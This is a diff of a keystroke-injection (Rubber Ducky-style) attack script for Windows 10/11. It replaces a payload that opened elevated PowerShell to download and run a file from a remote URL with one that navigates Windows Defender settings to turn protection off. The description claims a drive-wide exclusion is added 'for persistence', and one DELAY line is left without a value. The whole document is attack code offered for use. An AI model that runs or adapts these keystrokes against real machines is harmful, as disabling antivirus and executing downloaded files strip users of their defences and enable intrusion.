@@ -1,32 +1,36 @@
 REM Author: Pentestersploit/Adrilaw
 REM Github: https://github.com/Adrilaw
 REM Xda-developer: @Kidpentester
-REM Title: Windows Rickroll Attack
-REM Description: Starts a powershell to download the rickroll song and execute the downloaded file
-REM Target: Windows 10/11
+REM Title: Disable Windows Defender
+REM Description: Opens security settings, disabled Defender, then adds an exception of drive C for persistence.
+REM Target: Windows 10/11 
 REM Version: 1.2
 
-REM start of script
-REM
-REM let the HID enumerate
+REM Pause for everything to recognize and be ready
 DELAY 2000
+
+REM Open Windows Defender Settings
 GUI r
-DELAY 200
-REM my best attempt at a elevated powershell instance
-STRING powershell Start-Process powershell -Verb runAs
+DELAY 750
+STRING windowsdefender:
+DELAY 
 ENTER
-DELAY 3000
+
+REM Navigate to Manage Settings
+DELAY 10000
+ENTER
+DELAY 100
+TAB
+TAB
+TAB
+TAB
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 750
 TAB
 TAB
 SPACE
 DELAY 500
-ALT 
-DELAY 3000
-STRING $down = New-Object System.Net.WebClient;
-STRING $url = 'https://repo.library.stonybrook.edu/xmlui/bitstream/handle/11401/9656/rickroll.mp4?sequence=1&isAllowed=y';
-STRING $file = 'rickroll.mp4';
-STRING $down.DownloadFile($url,$file);
-STRING Start-Process $file;
-STRING exit;
-ENTER
-
+ALT F4
